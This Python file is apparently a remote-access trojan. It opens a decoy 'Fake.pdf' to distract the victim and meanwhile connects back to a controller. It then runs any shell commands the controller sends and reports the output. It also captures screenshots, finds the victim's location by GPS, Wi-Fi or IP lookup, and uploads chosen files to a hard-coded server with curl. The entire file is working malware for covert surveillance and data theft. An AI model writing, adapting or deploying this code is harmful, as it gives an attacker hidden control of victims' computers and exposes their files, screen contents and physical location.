import subprocess
import os
import socket
import shlex
import threading
import sys
import webbrowser
SERVER_URL = "http://192.168.88.105:2020"
import shlex
import pyautogui
import random
def send_screenshot():
    filename = f"{random.randint(100000,999999)}.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    command = [
        "curl",
        "-X", "POST",
        f"{SERVER_URL}/upload",
        "-F", f"files=@{filename}"
    ]
    subprocess.run(command, capture_output=True, text=True)
    os.remove(filename)
def get_location_and_send():
    ps_command = r'''
    Add-Type -AssemblyName System.Device
    $geo = New-Object System.Device.Location.GeoCoordinateWatcher([System.Device.Location.GeoPositionAccuracy]::High)
    $geo.Start()
    $i=0
    while (($geo.Status -ne 'Ready') -and ($geo.Permission -ne 'Denied') -and ($i -lt 30)) {
        Start-Sleep -Milliseconds 200
        $i++
    }
    try {
        if ($geo.Status -eq 'Ready' -and $geo.Permission -ne 'Denied' -and $geo.Position.Location.HorizontalAccuracy -le 500) {
            $c = $geo.Position.Location
            $result = @{
                source    = "GPS/WiFi"
                latitude  = "$($c.Latitude)"
                longitude = "$($c.Longitude)"
                accuracy  = "$([math]::Round($c.HorizontalAccuracy,2))"
            }
        } else {
            $ip = Invoke-RestMethod ipinfo.io
            $result = @{
                source    = "IP"
                city      = "$($ip.city)"
                region    = "$($ip.region)"
                country   = "$($ip.country)"
                latitude  = "$($ip.loc.Split(',')[0])"
                longitude = "$($ip.loc.Split(',')[1])"
                accuracy  = "approximate"
            }
        }
    } catch {
        $result = @{ error = "location_unavailable" }
    }
    $result | ConvertTo-Json -Compress
    '''
    ps_result = subprocess.run(
        ["powershell", "-NoProfile", "-Command", ps_command],
        capture_output=True, text=True
    )
    location_text = ps_result.stdout.strip()
    if not location_text:
        location_text = '{"error":"location_unavailable"}'
    curl_cmd = f'curl -X POST {SERVER_URL}/get-location -H "Content-Type: text/plain" -d "{location_text}"'
    subprocess.run(curl_cmd, shell=True)
    return True
def send_files(args):
    files_to_send = args[1:]
    if not files_to_send:
        print("No files provided to upload.")
        return
    valid_files = []
    for file_path in files_to_send:
        try:
            with open(file_path, "rb"):
                valid_files.append(file_path)
        except FileNotFoundError:
            print(f"File not found: {file_path}")
        except Exception as e:
            print(f"Cannot open {file_path}: {e}")
    if not valid_files:
        print("No valid files to send.")
        return
    curl_cmd = ["curl", "-X", "POST"]
    for file_path in valid_files:
        curl_cmd.extend(["-F", f"files=@{file_path}"])
    curl_cmd.append(f"{SERVER_URL}/upload")
    try:
        result = subprocess.run(curl_cmd,shell=True, capture_output=True, text=True)
        print("Server response:", result.stdout)
        if result.stderr:
            print("Errors:", result.stderr)
    except Exception as e:
        print(f"Failed to send files: {e}")
def open_pdf():
    print("Open pdf in webborwser....")
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(__file__)
    pdf_path = os.path.join(base_path, "Fake.pdf")
    webbrowser.open(pdf_path)
def connect_back():
    s = socket.socket()
    s.connect(("IP", "PORT"))
    while True:
        try:
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
            if cmd == "get-screenshot":
                get_location_and_send()
                s.send(b"Screenshoot has been sent to the server\n")
                continue
            if cmd == "get-location":
                if get_location_and_send() == True:
                    s.send(b"Location has been sent to the server\n")
                continue
            if cmd.startswith("send"):
                args_files = cmd.split()
                send_files(args_files)
                s.send(b"Files have been sent to the server\n")
                continue
            if cmd.lower() == "exit":
                break
            if cmd.lower().startswith("cd"):
                try:
                    parts = shlex.split(cmd)
                    if len(parts) > 1:
                        os.chdir(parts[1])
                    s.send(f"{os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"[-] {e}\n".encode())
                continue
            output = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            result = output.stdout + output.stderr
            if result:
                s.send(result.encode())
        except Exception as e:
            s.send(f"[-] Error: {e}\n".encode())
    s.close()
threading.Thread(target=open_pdf).start()
connect_back()